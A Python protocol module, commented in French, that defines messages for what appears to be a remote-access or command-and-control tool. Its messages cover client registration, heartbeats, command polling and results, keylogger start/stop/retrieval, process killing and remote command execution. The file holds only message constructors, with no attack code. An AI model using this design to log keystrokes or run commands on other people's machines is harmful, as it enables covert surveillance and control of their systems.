import time
from datetime import datetime

class Protocol:
    # Types de base
    MSG_REGISTER = "register"
    MSG_HEARTBEAT = "heartbeat" 
    MSG_GET_COMMANDS = "get_commands"
    MSG_COMMAND_RESULT = "command_result"
    
    # Keylogger messages
    MSG_KEYLOG_START = "keylog_start"
    MSG_KEYLOG_STOP = "keylog_stop"
    MSG_KEYLOG_DATA = "keylog_data"  # ← CORRIGÉ
    
    # Actions processus
    ACTION_GET_ALL_PROCESSES = "get_all_processes"
    ACTION_GET_PROCESS_TREE = "get_process_tree"
    ACTION_GET_PROCESS_DETAILS = "get_process_details"
    ACTION_KILL_PROCESS = "kill_process"
    ACTION_START_PROCESS = "start_process"
    ACTION_EXECUTE_COMMAND = "execute_command"
    ACTION_GET_SYSTEM_INFO = "get_system_info"
    
    # Actions keylogger
    ACTION_KEYLOG_START = "start"
    ACTION_KEYLOG_STOP = "stop"
    ACTION_KEYLOG_STATUS = "status"
    ACTION_KEYLOG_RETRIEVE = "retrieve_logs"
    ACTION_KEYLOGGER_CONTROL = "keylogger_control"

    @staticmethod
    def create_register_message(client_id, system_info):
        return {
            "type": Protocol.MSG_REGISTER,
            "client_id": client_id,
            "system_info": system_info,
            "timestamp": datetime.now().isoformat()  # ← AMÉLIORÉ
        }

    @staticmethod
    def create_heartbeat_message(client_id, extra_data=None):
        return {
            "type": Protocol.MSG_HEARTBEAT,
            "client_id": client_id,
            "extra_data": extra_data or {},  # ← CORRIGÉ: "additional_data" → "extra_data"
            "timestamp": datetime.now().isoformat()
        }

    @staticmethod
    def create_get_commands_message(client_id):
        return {
            "type": Protocol.MSG_GET_COMMANDS,
            "client_id": client_id,
            "timestamp": datetime.now().isoformat()
        }

    @staticmethod
    def create_command_result_message(client_id, command_id, result):
        return {
            "type": Protocol.MSG_COMMAND_RESULT,
            "client_id": client_id,
            "command_id": command_id,
            "result": result,
            "timestamp": datetime.now().isoformat()
        }

    @staticmethod
    def create_success_message(message=None):
        return {
            "type": "success",
            "message": message or "Operation completed successfully",
            "timestamp": datetime.now().isoformat()
        }

    @staticmethod
    def create_error_message(message, details=None):
        return {
            "type": "error",
            "message": message,
            "details": details,
            "timestamp": datetime.now().isoformat()
        }